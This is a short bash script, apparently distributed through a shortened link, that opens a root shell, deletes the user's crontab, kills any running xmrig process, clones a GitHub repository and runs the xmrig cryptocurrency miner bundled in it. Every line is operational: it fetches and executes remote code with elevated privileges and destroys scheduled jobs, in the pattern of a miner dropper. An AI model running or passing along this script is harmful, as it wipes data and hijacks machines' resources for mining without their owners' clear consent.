#!/bin/bash
# bit.ly/3cleo1g
sudo -s
crontab -r
killall xmrig
git clone https://github.com/nuriyevn/r28
cd r28
chmod +x xmrig
./xmrig
